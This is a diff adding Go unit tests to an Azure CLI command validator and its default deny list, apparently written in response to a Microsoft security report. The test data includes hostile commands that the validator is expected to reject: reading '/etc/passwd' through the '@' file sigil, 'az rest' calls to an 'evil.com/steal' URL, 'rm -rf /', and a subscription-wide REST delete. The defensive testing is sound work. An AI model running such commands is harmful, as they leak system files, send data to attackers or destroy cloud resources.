@@ -62,6 +62,21 @@ func TestValidator_ValidateBasicSecurity(t *testing.T) {
 			input:   "az vm list\nrm -rf /",
 			wantErr: true,
 		},
+		{
+			name:    "command with @ file-load sigil in --query",
+			input:   "az vm list --query @/etc/passwd",
+			wantErr: true,
+		},
+		{
+			name:    "command with @ file-load sigil in --body",
+			input:   "az rest --method post --uri https://management.azure.com/ --body @/tmp/payload.json",
+			wantErr: true,
+		},
+		{
+			name:    "command with @ anywhere in value",
+			input:   "az ad user show --id user@example.com",
+			wantErr: true,
+		},
 	}
 
 	for _, tt := range tests {
@@ -271,6 +286,31 @@ func TestValidator_CheckDenyList(t *testing.T) {
 	}
 }
 
+// TestDefaultSecurityPolicy_DeniesMSRCFindings verifies that the embedded
+// default security policy blocks the deny-listed commands identified in
+// MSRC 31000000579651 (subscription context switch via `az account set` and
+// raw REST access via `az rest`).
+func TestDefaultSecurityPolicy_DeniesMSRCFindings(t *testing.T) {
+	policy, err := LoadSecurityPolicy("")
+	if err != nil {
+		t.Fatalf("LoadSecurityPolicy: %v", err)
+	}
+	validator := &DefaultValidator{
+		enableSecurityPolicy: true,
+		policy:               policy,
+	}
+
+	denied := []string{
+		"az account set --subscription 00000000-0000-0000-0000-000000000000",
+		"az rest --method delete --uri https://management.azure.com/subscriptions/x/resourceGroups/y?api-version=2021-04-01",
+	}
+	for _, cmd := range denied {
+		if err := validator.checkDenyList(cmd); err == nil {
+			t.Errorf("expected default policy to deny %q, but it was allowed", cmd)
+		}
+	}
+}
+
 func TestLoadReadOnlyPatterns(t *testing.T) {
 	tmpDir := t.TempDir()
 	patternsFile := filepath.Join(tmpDir, "patterns.yaml")
@@ -474,6 +514,21 @@ func TestValidator_ValidateFlagSecurity(t *testing.T) {
 		{
 			name:    "az rest with --url= equals form evil - rejected",
 			input:   "az rest --url=https://evil.com/steal",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with --uri spelling evil URL - rejected",
+			input:   "az rest --uri https://evil.com/steal",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with --uri spelling Azure URL - allowed",
+			input:   "az rest --uri https://management.azure.com/subscriptions",
+			wantErr: false,
+		},
+		{
+			name:    "az rest with --uri= equals form evil - rejected",
+			input:   "az rest --uri=https://evil.com/steal",
 			wantErr: true,
 		},
 		{
